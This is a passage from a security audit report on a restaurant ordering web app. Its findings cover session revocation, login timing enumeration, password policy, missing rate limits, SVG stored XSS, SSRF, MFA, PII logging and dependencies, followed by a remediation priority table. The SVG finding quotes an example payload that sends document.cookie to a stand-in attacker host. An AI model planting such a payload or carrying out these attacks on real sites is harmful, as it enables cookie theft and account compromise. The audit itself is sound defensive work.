- **Description:** The two hand-rolled customer JWT systems (`ff_customer`, `ff_rest_account`) are 30-day, stateless, and NOT server-revocable. Logout only clears the cookie; password reset does not invalidate previously issued tokens. There is no `tokenVersion`/`sessionEpoch`.
- **Failure / attack scenario:** An attacker exfiltrates a customer's `ff_customer` JWT (shared/compromised device, proxy log). The victim changes their password and logs out. The stolen token remains valid for up to 30 days because `getCurrentCustomer` only checks that the account row still exists, not a revocation epoch.
- **Impact:** Password reset does not actually cut off an attacker who already holds a token; no "log out everywhere." Applies to both marketplace and per-restaurant customer bases.
- **Evidence:** `signCustomerToken`/`verifyCustomerToken` carry only `{customerAccountId,email}`; `getCurrentCustomer` re-fetches the row but has no version check (`customer-session.ts:63-80`). Reset-password routes update `passwordHash` only. Logout routes delete the cookie only.
- **Recommended remediation:** Add a `sessionEpoch`/`tokenVersion` int column to `CustomerAccount` and `Customer`, embed it in the JWT, verify equality on read, and bump it on password reset and explicit logout-everywhere.
- **Professional review required:** Yes — schema change on both Neon branches (per AGENTS.md); confirm the read-path version check doesn't add a hot-path query for every customer request (cache/index).

### LR-SEC-07 — Anti-enumeration dummy hash is malformed, defeating timing equalization
- **Severity:** Medium
- **Component:** Login timing anti-enumeration (dummy hash malformed)
- **Affected paths:** `src/app/api/customer/login/route.ts:17,47-52`; `src/app/api/restaurants/[slug]/account/login/route.ts:105-107`
- **Description:** The `DUMMY_HASH` constants used to equalize bcrypt timing for non-existent users are **not valid bcrypt hashes**, so `bcryptjs.compare` against them returns almost instantly instead of taking the full cost-10 time. The intended timing-equalization is defeated.
- **Failure / attack scenario:** An attacker POSTs to `/api/customer/login` (or `/account/login`) with a candidate email and any password and measures response latency. Non-existent emails return ~1000× faster (~0.15–0.34 ms vs ~350 ms for a real cost-10 compare), letting the attacker enumerate which emails have accounts despite the identical error body.
- **Impact:** Account enumeration on the two customer login surfaces via response timing, undermining the stated anti-enumeration intent.
- **Evidence:** Local `bcryptjs` measurement: `compare('x', <malformed>)` returns in ~150–340 µs immediately; `compare` against a real `hashSync('y',10)` takes ~396 ms. The constants at `customer/login:17` and `account/login:105` are fixed strings that are not well-formed bcrypt digests.
- **Recommended remediation:** Replace the constants with a real bcrypt hash computed once at module load, e.g. `const DUMMY_HASH = bcrypt.hashSync('unused-placeholder', 10);` so the compare path takes constant, realistic time for missing users.
- **Professional review required:** No — one-line fix; optionally verify with a timing measurement that hit/miss latencies converge.

### LR-SEC-08 — Password policy is inconsistent; customer + reset paths are weakest
- **Severity:** Medium
- **Component:** Password strength & hashing-cost inconsistency
- **Affected paths:** `src/lib/password.ts:4-11`; `src/app/api/auth/reset-password/route.ts:33`; `src/app/api/customer/signup/route.ts:19,37`; `src/app/api/customer/reset-password/route.ts:31`; `src/app/api/restaurants/[slug]/account/signup/route.ts:37,65`; `src/app/api/restaurants/[slug]/account/reset-password/route.ts:49-51`
- **Description:** Owner/staff accounts enforce strong passwords (>=10 chars, upper+digit+special via `validatePassword`). Both customer systems accept 8-char passwords with **no complexity**. The per-restaurant reset endpoint enforces only length >=8 with no complexity — weaker than even its own signup — and bcrypt cost is 10 on all reset/customer paths vs 12 at owner register.
- **Failure / attack scenario:** A customer (or an attacker setting a password via a reset link) sets `password` (8 chars, no complexity) on either customer system; the per-restaurant reset accepts it with the weakest check in the codebase. Combined with cost-10 hashing, this makes offline cracking of a leaked customer DB materially easier than for owner accounts.
- **Impact:** Weakest-link password policy on the largest user population (customers); inconsistent hashing cost; reset paths weaker than signup paths.
- **Evidence:** `validatePassword` requires len>=10 + classes (`password.ts`). `customer/signup` `MIN_PASSWORD_LENGTH=8` no complexity; `account/signup` `MIN_PASSWORD_LENGTH=8` no complexity; `account/reset-password` checks `password.length<8` only. `bcrypt.hash` cost 10 at `reset-password:33`, `customer/signup:52`, `customer/reset:52`, `account/signup:124`, `account/reset:68` vs cost 12 at `register:276`.
- **Recommended remediation:** Apply `validatePassword()` (or an equivalent shared policy) to all customer signup + reset endpoints, and standardize bcrypt cost at 12 across every hash site.
- **Professional review required:** Yes (product decision) — tightening customer password rules affects signup UX/conversion; agree the minimum policy with the owner before enforcing.

### LR-SEC-09 — `POST /api/orders` has no per-IP rate limit
- **Severity:** Medium
- **Component:** Rate limiting — order creation
- **Affected paths:** `src/app/api/orders/route.ts`
- **Description:** `POST /api/orders`, the money-critical order-creation endpoint, has **no per-IP rate limit** (zero `rateLimit`/`rateLimitShared` calls). It relies on `idempotencyKey` (dup-submit only), entitlement checks, and order-cap logic — none of which throttle raw request volume from a single source.
- **Failure / attack scenario:** An unauthenticated attacker scripts thousands of order POSTs against a restaurant slug: each triggers DB writes, promo/reward reservation, order-cap increments, and email/notification fan-out.
- **Impact:** Cost inflation, kitchen-feed pollution, and potential exhaustion of a restaurant's order cap or reward ledger before humans notice; degrades the customer-order hot path AGENTS.md flags as critical.
- **Evidence:** `grep -c 'rateLimit' src/app/api/orders/route.ts → 0`. By contrast `payment-intent`/`paypal`/`coupon` each carry `rateLimit(...:ip, 10, 60_000)`.
- **Recommended remediation:** Add a per-IP (ideally also per-slug) `rateLimitShared` guard at the top of the POST handler (~10–20/min/IP) before any DB work. The lib fails open on store errors, so checkout availability is preserved.
- **Professional review required:** No — choose a threshold that comfortably exceeds legitimate ordering (a large group order is still a handful of POSTs).

### LR-SEC-10 — Nominatim geocode proxy has no rate limit (shared-egress ban risk)
- **Severity:** Medium
- **Component:** Rate limiting — Nominatim geocode proxy
- **Affected paths:** `src/app/api/public/geocode/search/route.ts`
- **Description:** `GET /api/public/geocode/search` proxies OpenStreetMap Nominatim under the platform's shared User-Agent with only a per-instance 10-minute dedup cache and **no rate limit**. Nominatim's usage policy caps ~1 req/s/IP and bans abusers.
- **Failure / attack scenario:** An attacker or buggy client sends high-volume distinct queries; because the platform sets a single shared User-Agent, Nominatim throttles/bans the platform's egress IP.
- **Impact:** A single ban breaks address autocomplete for **all** Leaflet-based restaurants simultaneously — a platform-wide outage of a checkout-adjacent feature triggered by one abuser. Shared-egress-reputation risk.
- **Evidence:** `route.ts:20-33` only implements an in-memory `CACHE` keyed by `country|q`; no `getClientIp`/`rateLimit` call. The route comment at `:8` itself acknowledges the ~1 req/sec/IP Nominatim cap.
- **Recommended remediation:** Add a per-IP `rateLimit` (e.g. 30/min) before the outbound fetch; keep the cache. Consider a global soft cap to protect the shared egress reputation.
- **Professional review required:** No — straightforward limit; keep the existing cache in place.

### LR-SEC-11 — Customer signup endpoints have no rate limit
- **Severity:** Medium
- **Component:** Rate limiting — customer signup
- **Affected paths:** `src/app/api/customer/signup/route.ts`; `src/app/api/restaurants/[slug]/account/signup/route.ts`
- **Description:** `POST /api/customer/signup` (and the per-restaurant signup route) have no rate limit. Each request creates a `CustomerAccount` and fires a verification email (Resend); the restaurant-scoped variant additionally grants a reward sign-up bonus.
- **Failure / attack scenario:** An attacker scripts signups to flood Resend or, on the restaurant path, to probe the sign-up-bonus grant flow.
- **Impact:** Verification-email spam inflates Resend cost and risks the sending domain's deliverability reputation; on the restaurant path it exercises the reward-bonus grant repeatedly. Unbounded account creation from a single IP.
- **Evidence:** `customer/signup/route.ts` POST (`:21`) has no `getClientIp`/`rateLimit` import; `restaurants/[slug]/account/signup/route.ts` POST (`:39`) likewise, and grants `rewardSignupBonus` at `:208-218`.
- **Recommended remediation:** Add a per-IP `rateLimit` (~5–10/hr, matching `auth/register`'s 5/hr) to both signup handlers before account creation and email dispatch.
- **Professional review required:** No — mirror the existing `auth/register` limit.

### LR-SEC-12 — Per-restaurant Stripe webhook failures never reach Sentry
- **Severity:** Medium
- **Component:** Error reporting — restaurant-stripe webhook not alertable
- **Affected paths:** `src/app/api/webhooks/restaurant-stripe/[restaurantId]/route.ts:204`
- **Description:** The per-restaurant Stripe webhook (customer-order refunds/captures) catches failures with `console.error` only and does **not** call `reportError`, so failures never reach Sentry. `reportError` exists precisely to make money/webhook catches alertable and is wired into the platform Stripe + PayPal + orders handlers but not this one.
- **Failure / attack scenario:** A decrypt failure, schema drift, or DB error causes the handler to 500 on every Stripe retry for a given restaurant. Stripe retries for hours/days.
- **Impact:** With only `console.error`, no alert fires and the restaurant's refund/capture sync silently breaks until a human notices missing money movement — exactly the silent-webhook-failure scenario `report-error.ts` was written to prevent, on a money path.
- **Evidence:** Handler catch at `:204` `console.error("[restaurant-stripe webhook]", msg)` with no `reportError`. grep shows `reportError` present only in `orders/route.ts`, `webhooks/stripe/route.ts`, `webhooks/paypal/route.ts`.
- **Recommended remediation:** Add `reportError(e, { stage: 'restaurant-stripe-webhook', restaurantId })` to the catch (identifiers only per `report-error.ts`). Consider the same for the cron sweeps, which also only `console.error`.
- **Professional review required:** No — additive, identifiers-only; low risk.

### LR-SEC-13 — Reseller SVG logo upload enables stored-XSS via direct blob navigation
- **Severity:** Low
- **Component:** Reseller SVG upload — stored-XSS (blob origin)
- **Affected paths:** `src/app/api/reseller/upload/route.ts:22-28,56-76`
- **Description:** The reseller upload endpoint allow-lists `image/svg+xml` (the other upload endpoints — `api/upload`, `reseller-reports/upload` — do not). The SVG is stored on Vercel Blob with `access:'public'` and served with `Content-Type image/svg+xml`. The in-code comment reasons it's safe because logos render in `<img>` (where scripts don't execute) — true for the `<img>` path, but the returned public blob URL is **directly navigable**, and an SVG opened as a top-level document DOES execute embedded `<script>`/`onload`.
- **Failure / attack scenario:** A reseller uploads `logo.svg` containing `<svg onload="…"><script>fetch('https://evil/?c='+document.cookie)</script></svg>`. It is accepted (MIME allow-listed), stored public, and its `https://<id>.public.blob.vercel-storage.com/reseller/<id>/<file>.svg` URL is handed back. If that URL is ever opened directly (shared, previewed, or linked in an admin/superadmin surface) the script runs in the **blob** origin. Blob is a separate origin from the app so app-cookie theft is not direct, but it is still an arbitrary-JS execution + phishing vector under a URL that looks like platform storage.
- **Impact:** Limited stored-XSS / content-spoofing confined to the blob storage origin (cross-origin from the app, so first-party session cookies are not directly exposed). Real but bounded — hence Low.
- **Evidence:** `reseller/upload/route.ts:22-28` allow-lists `'image/svg+xml':'svg'` with a comment; `put(..., access:'public')` at `:72-75`. The parallel endpoints `api/upload/route.ts:6-11` and `reseller-reports/upload/route.ts:22-29` deliberately omit SVG.
- **Recommended remediation:** Either drop `image/svg+xml` from the allow-list (rasterize logos to PNG/WebP), or sanitize uploaded SVGs server-side (e.g. DOMPurify with SVG profile) and force a `Content-Disposition`/`Content-Type` that prevents active execution, and never surface the raw blob URL as a navigable link.
- **Professional review required:** Yes — decide the logo-format policy (drop SVG vs sanitize) with the owner, since resellers may rely on SVG logos.

### LR-SEC-14 — Menu-image re-host cron fetches stored `sourceUrl` with no host allow-list
- **Severity:** Low
- **Component:** Menu-image cron — unbounded fetch (defense-in-depth)
- **Affected paths:** `src/app/api/cron/import-menu-images/route.ts:87`; `src/app/api/menu/import-gloriafood/route.ts:307,346,472`
- **Description:** The per-minute cron does `fetch(row.sourceUrl)` with no host allow-list. In the current data flow `sourceUrl` is always an `fbgcdn.com` URL constructed in `fetchGloriaFoodPictures` (`gloriafood.ts:355`), and item/category `sourceImageUrl` only ever comes from that pictures map, so it is **not attacker-controllable today**. However, there is no defensive host check at the fetch site, so any future code path that writes a `PendingMenuImage.sourceUrl` from a less-trusted source would immediately become a cron-driven SSRF with no second guard.
- **Failure / attack scenario:** Not exploitable via current inputs. Becomes exploitable if a future feature (e.g. an admin "add image by URL", or the un-clamped admin import in LR-SEC-05 feeding a manipulated picture host) writes an arbitrary `sourceUrl` into `PendingMenuImage` — the cron would then fetch it server-side on a schedule.
- **Impact:** Defense-in-depth gap only; no current exploit path. Flagged so the seam is documented per the scale/security standing rules.
- **Evidence:** `cron/import-menu-images/route.ts:87` `await fetch(row.sourceUrl, …)` with no URL/host validation; contrast `import-pdf/route.ts:67-71`, which DOES validate the blob host with a regex before fetching.
- **Recommended remediation:** Add an `isGloriaFoodHost()`/CDN allow-list check on `row.sourceUrl` before fetch in the cron worker (mirror the `import-pdf` blob-host guard), so the trust boundary is enforced at the fetch site rather than relying on every future writer of `sourceUrl`.
- **Professional review required:** No — additive guard; pair with LR-SEC-05.

### LR-SEC-15 — No MFA anywhere, including superadmin
- **Severity:** Low
- **Component:** MFA absence
- **Affected paths:** `src/lib/auth.ts`; `src/lib/auth-kitchen.ts`; `src/app/api/superadmin/impersonate/route.ts`
- **Description:** No second factor exists for any account, including superadmin (which can impersonate any tenant, touch payout config, and read all customer PII).
- **Failure / attack scenario:** A superadmin password is phished or reused-and-breached; the attacker gains full platform-wide control gated only by password + lockout, and can impersonate every restaurant without additional challenge.
- **Impact:** Single-factor compromise of the most powerful account fully compromises the platform; elevated risk as tenant/user count grows.
- **Evidence:** No TOTP/WebAuthn code anywhere (grep for `totp`/`mfa`/`2fa`/`webauthn` yields only i18n message-file false positives). `authOptions`/`kitchenAuthOptions` use `CredentialsProvider` with password only.
- **Recommended remediation:** Add TOTP (or WebAuthn) as a required second factor for `superadmin` and `reseller_partner`, and offer it optionally for `restaurant_admin`, before scaling.
- **Professional review required:** Yes — a roadmap/security-priority decision; scope MFA for superadmin first. Low severity today but high blast radius.

### LR-SEC-16 — Signup endpoints confirm account existence (email enumeration)
- **Severity:** Low
- **Component:** Signup account enumeration
- **Affected paths:** `src/app/api/auth/register/route.ts:125-129`; `src/app/api/customer/signup/route.ts:44-50`; `src/app/api/restaurants/[slug]/account/signup/route.ts:90-103`
- **Description:** Signup endpoints return an explicit "account with this email already exists" response, allowing email enumeration. The `register.ts` inline comment claims the message prevents enumeration, which is inaccurate.
- **Failure / attack scenario:** An attacker submits signup requests with candidate emails and reads the 400/409 "already exists" response to build a list of registered restaurant owners and customers.
- **Impact:** Email enumeration via signup on all three signup surfaces; low severity (common tradeoff for signup UX) but the code comment is misleading.
- **Evidence:** `register:127-128` returns "An account with this email already exists" directly under a comment claiming same-message anti-enumeration; `customer/signup:46-49` returns 409 "already exists"; `account/signup:99-102` returns 409 "already exists".
- **Recommended remediation:** Accept the tradeoff but correct the misleading comment, or move to an email-verification-first signup that returns a generic "check your email" regardless of existence. At minimum add rate-limiting parity (customer signups are not rate-limited like register — see LR-SEC-11).
- **Professional review required:** No — correct the comment at minimum; the full anti-enumeration signup flow is an optional product change.

### LR-SEC-17 — Customer login has no DB lockout backstop (weak under store outage)
- **Severity:** Low
- **Component:** Customer login brute-force fallback
- **Affected paths:** `src/lib/login-protection.ts:87-90`; `src/app/api/customer/login/route.ts:38-50`; `src/app/api/restaurants/[slug]/account/login/route.ts:69-147`
- **Description:** DB-backed lockout (layer 2) exists only for `User` rows (owner/staff/kitchen). The two customer systems rely solely on the shared-store failure counters; if the shared store is unconfigured or down (limiter fails open to per-isolate Map), customer accounts have materially weaker brute-force protection than owner accounts.
- **Failure / attack scenario:** With no Upstash/KV configured (or during a store outage), an attacker distributes guesses across Vercel isolates; per-isolate Map counters allow roughly N× the intended attempts against a targeted customer email, and there is no DB lockout backstop for `CustomerAccount`/`Customer`.
- **Impact:** Customer credential-stuffing/brute-force resistance degrades to per-isolate limits under store failure; owner accounts are protected in that scenario, customers are not.
- **Evidence:** `userNotLocked`/`registerUserLoginFailure` operate on `prisma.user` only (`login-protection.ts:88,95`). Customer login handlers call `loginAttemptAllowed`/`recordLoginFailure` but there is no `lockedUntil`/`failedLoginCount` on `CustomerAccount` or `Customer` in `schema.prisma`. `rate-limit.ts` documents fail-open on store errors.
- **Recommended remediation:** Add `failedLoginCount`/`lockedUntil` (or a shared-store-independent lockout) to `CustomerAccount` and `Customer`, mirroring the `User` lockout, so customer brute-force protection does not depend solely on the optional shared store.
- **Professional review required:** Yes — schema change on both Neon branches; alternatively closed by ensuring the shared store is configured in prod (LR-SEC-20).

### LR-SEC-18 — Unauthenticated order-status GET returns customer PII by order id
- **Severity:** Low
- **Component:** Order status GET — unauthenticated read (by design?)
- **Affected paths:** `src/app/api/orders/[id]/route.ts` (GET, `PUBLIC_ORDER_SELECT` branch)
- **Description:** When the caller has no restaurant session, `GET /api/orders/[id]` returns the full public order projection for **any** order id with no ownership check and without requiring the signed HMAC token that `order-status-token.ts` provides. Appears intentional (guest-accessible status page) but should be confirmed.
- **Failure / attack scenario:** Anyone who obtains or guesses an order id (forwarded link, shared screenshot, logs, referer leakage) can fetch `customerName`, delivery street/city/zip, order totals, applied promos, and restaurant contact context without authenticating.
- **Impact:** Customer PII (name + delivery address) exposure per order id. Mitigated by `cuid` ids being high-entropy and non-enumerable and by the projection excluding card/payment secrets, so practical risk is low, but it is an unauthenticated PII read path.
- **Evidence:** GET handler: after the `if (user?.restaurantId)` owner branch, the fallback does `prisma.order.findUnique({ where: { id }, select: PUBLIC_ORDER_SELECT })` and returns it with no token/ownership verification, even though `verifyOrderToken` is imported and `signOrderToken` is used elsewhere for shareable links.
- **Recommended remediation:** Confirm this is the intended guest-status contract. If PII exposure is a concern, require the signed order token (`verifyOrderToken` against a `?t=` param) for the unauthenticated branch, or drop delivery address/customerName from the token-less projection and include them only when a valid token or matching customer session is present.
- **Professional review required:** Yes — confirm-by-design decision with the owner; if guest status is intended, weigh token-gating vs the PII in the token-less projection.

### LR-SEC-19 — Customer email/phone logged in cleartext on auth/notification paths
- **Severity:** Low
- **Component:** Logging hygiene — PII in logs
- **Affected paths:** `src/app/api/auth/forgot-password/route.ts:27`; `src/app/api/customer/forgot-password/route.ts:44`; `src/app/api/restaurants/[slug]/account/forgot-password/route.ts:95`; `src/app/api/cron/order-alert-calls/route.ts:195,283`; digest-cron `:190,232`; autopilot `:327,451`; notifications `:314`
- **Description:** Forgot-password handlers log the submitted email in cleartext on the no-account branch (the restaurant variant logs slug+email). Several notification libs log recipient `.email` on send failure, and `cron/order-alert-calls` logs the customer phone. None involve credentials or card data, but this is the PII-in-logs class the stabilization flagged.
- **Failure / attack scenario:** Anyone with access to Vercel/production logs (or a log-shipping integration) can harvest customer emails and phones, and can confirm which emails do/don't have accounts from the "no user for `<email>`" lines (an enumeration oracle).
- **Impact:** Customer PII exposure to anyone with log access and an account-enumeration oracle on the forgot-password path; GDPR-posture concern. Low because logs are not client-visible and no credentials/cards are involved.
- **Evidence:** `auth/forgot-password/route.ts:27` `console.log("[forgot-password] no user for", cleanEmail)`; `customer/forgot-password:44`; `restaurants/[slug]/account/forgot-password:95`; `cron/order-alert-calls:195/283` log `to: phone`; digest-cron/autopilot/notifications log recipient `.email`.
- **Recommended remediation:** Drop the email from the no-account forgot-password logs (log a constant or hashed/truncated form). Elsewhere prefer a hashed email or recipient id over the raw address/phone. Logging-only change, no behavior impact.
- **Professional review required:** No — logging-only scrub; prioritize the forgot-password lines (they double as an enumeration oracle).

### LR-SEC-20 — Cross-isolate rate limiting requires prod env config
- **Severity:** Informational
- **Component:** Rate limiting — shared store requires prod env config
- **Affected paths:** `src/lib/rate-limit.ts:59`; `src/lib/login-protection.ts`
- **Description:** `rateLimitShared` and the login failure counters only enforce **cross-isolate** limits when `UPSTASH_REDIS_REST_URL`/`TOKEN` (or `KV_REST_API_URL`/`TOKEN`) are set. Without them the limiter silently degrades to per-isolate Maps (warns once), so on a multi-isolate Vercel deployment the effective limit is N×intended and login brute-force protection weakens to per-isolate.
- **Failure / attack scenario:** If prod is deployed without the Upstash/KV env vars, an attacker spreading requests across many warm isolates gets roughly N× the intended login/checkout attempts before any single isolate trips.
- **Impact:** Weakened brute-force and abuse protection at scale (the 100→1000→10000 user target makes multi-isolate the norm). Config-only remediation, so informational rather than a code defect.
- **Evidence:** `rate-limit.ts:59-63` `sharedStoreConfig()` returns null when env unset; `:78-86` falls back to per-isolate `rateLimit` with a one-time warn. `login-protection.ts` relies on the same counters.
- **Recommended remediation:** Confirm `UPSTASH_REDIS_REST_URL` + `UPSTASH_REDIS_REST_TOKEN` (or Vercel KV equivalents) are set in production. Owner/config verification, not a code change.
- **Professional review required:** Yes — ops verification. Confirming this env config also closes the store-outage half of LR-SEC-17.

### LR-SEC-21 — `next-auth → uuid` moderate advisory (accepted risk, no in-place fix)
- **Severity:** Informational
- **Component:** Dependencies — `next-auth`/`uuid` accepted risk
- **Affected paths:** `package.json:61` (`next-auth: ^4.24.14`)
- **Description:** `next-auth@4.24.14` depends on a vulnerable `uuid` (`<11.1.1`, moderate buffer-bounds issue). Audit's only offered fix downgrades `next-auth` to v3 (breaking), so this cannot be remediated in place and should be tracked as accepted risk pending a deliberate `next-auth` major upgrade.
- **Failure / attack scenario:** Low practical impact — the `uuid` bug requires a caller-provided buffer to v3/v5/v6, which `next-auth` does not expose to attacker input.
- **Impact:** Negligible in practice; noted only so it is a *tracked* accepted risk rather than a silent one. Do not auto-fix (would break auth).
- **Evidence:** `npm audit --omit=dev`: `uuid <11.1.1 … Will install next-auth@3.29.10, which is a breaking change`.
- **Recommended remediation:** Do **NOT** run `audit fix --force` here. Track for a future planned `next-auth` upgrade; no immediate action.
- **Professional review required:** Yes — accept and track; revisit at the next `next-auth` major upgrade.

---

## 8. Remediation priority (continuing-operation)

| Priority | Findings | Rationale |
|---|---|---|
| **P1 — schedule now** | LR-SEC-02, LR-SEC-01 | Intra-tenant RBAC and impersonation audit compound as staff/superadmin usage grows; both are owner-facing trust controls with tested primitives already in the codebase. |
| **P2 — owner sign-off then apply** | LR-SEC-03, LR-SEC-04 | In-range dependency patches on HIGH advisories touching the proxy/HTTP-client hot paths. Blocked only on the standing no-auto-upgrade rule. |
| **P3 — cheap hardening on live paths** | LR-SEC-05, LR-SEC-09, LR-SEC-10, LR-SEC-11, LR-SEC-12, LR-SEC-07 | Small, mostly mechanical changes closing SSRF, missing rate limits, silent webhook failure, and the timing oracle. |
| **P4 — consistency / roadmap** | LR-SEC-06, LR-SEC-08, LR-SEC-13, LR-SEC-14, LR-SEC-15, LR-SEC-16, LR-SEC-17, LR-SEC-18, LR-SEC-19 | Session revocation, password-policy alignment, SVG policy, MFA, enumeration, PII logging — hardening and product decisions. |
| **P5 — verify / track** | LR-SEC-20, LR-SEC-21 | Confirm prod env config; track the `next-auth` accepted risk. |

*Every remediation above is subject to the AGENTS.md standing rules — no regressions (trace hot paths, run `npm run preflight`), i18n parity for any new user-facing string, and schema changes pushed to both Neon branches.*
